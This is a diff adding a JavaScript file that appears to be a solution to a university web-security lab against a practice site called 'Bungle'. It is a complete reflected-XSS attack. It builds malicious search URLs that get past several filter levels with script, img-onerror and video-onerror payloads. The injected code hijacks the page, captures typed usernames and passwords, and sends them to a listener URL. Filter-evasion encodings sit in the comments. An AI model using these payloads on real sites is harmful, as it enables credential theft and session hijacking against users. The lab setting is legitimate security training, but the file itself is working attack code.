@@ -1,0 +1,102 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+// Extend this function:
+function payload(attacker) {
+	function log(data) {
+		console.log($.param(data))
+		$.get(attacker, data);
+	}
+	function proxy(href) {
+		$("html").load(href, function(){
+			$("html").show();
+			log({event: "nav", uri: href});
+			//$("#query").val("pwned!");
+			history.pushState(null,null,href)
+			spying();
+
+		});
+	}
+	function spying(){
+		$("#bungle-lnk").click(function(event){
+			event.preventDefault();
+			proxy("./");
+		})
+
+		$("#search-btn").click(function(event){
+			event.preventDefault();
+			proxy("search?q="+$("#query").val());
+		})
+
+		$("#search-again-btn").click(function(event){
+			event.preventDefault();
+			proxy("./");
+		})
+
+		$("#log-in-btn").click(function(event){
+			event.preventDefault();
+			log({event: "login", user: $("#username").val(),pass: $("#userpass").val()});
+			$("html").load("login",{username:$("#username").val(),password:$("#userpass").val()}, function(){spying();});
+		})
+
+		$("#create-btn").click(function(event){
+			event.preventDefault();
+			log({event: "create", user: $("#username").val(),pass: $("#userpass").val()});
+			$("html").load("create",{username:$("#username").val(),password:$("#userpass").val()}, function(){spying();});
+		})
+
+		$("#log-out-btn").click(function(event){
+			event.preventDefault();
+			log({event: "logout", logged_in_user:$("#logged-in-user").text()});
+			$("html").load("logout",{},function(){spying();})
+		})
+	}
+
+	$("html").hide();
+	proxy("./");
+
+}
+
+function makeLink(xssdefense, target, attacker) {
+	if (xssdefense == 0) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
+		encodeURIComponent("<script" + ">" + payload.toString() +";payload(\"" + attacker + "\");</script" + ">");
+	} 
+	else if(xssdefense == 1) {
+	// Implement code to defeat XSS defenses here.
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<img src='missing' onerror='" + payload.toString() + ";payload(\"" + attacker + "\");'/>");
+
+		//test case
+		/*return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<img src='missing' onerror="+"alert('xss'); />");*/
+	}
+
+	else if(xssdefense == 2){
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<img src='missing' onerror='" + payload.toString() + ";payload(\"" + attacker + "\");'/>");
+		//test case
+		/*return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<img src='missing' onerror="+"alert('xss'); />");*/
+
+	}
+
+	else if(xssdefense == 3){
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<video src='missing' onerror='" + payload.toString() + ";payload(\"" + attacker + "\");'/>");
+		/*return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<BR SIZE=\"&{alert(1)}\">");
+		//test case
+		
+		/*return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("&#60"+"img src='missing' onerror='java"+"&#115;&#99;&#114;&#105;&#112;&#116"+":alert(1);'/>");*/
+			/*String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,39,88,83,83,39,41,60,47,115,99,114,105,112,116,62));*//*"%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%29%3c%2f%73%63%72%69%70%74%3e");*//*+"String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)");*//*"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62alert();&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62");*/
+	}
+	else if(xssdefense==4){
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + 
+		encodeURIComponent(("<script" + ">" + payload.toString() +";payload(\"" + attacker + "\");</script" + ">").replace(";","\n "));
+	}
+}
+var xssdefense = 3;
+var target = "http://trurl.cs.illinois.edu/";
+var attacker = "http://127.0.0.1:31337/stolen";
+$(function() {
+	var url = makeLink(xssdefense, target, attacker);
+	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+	//$("b").html(url);
+});
+</script>
+<h3></h3>
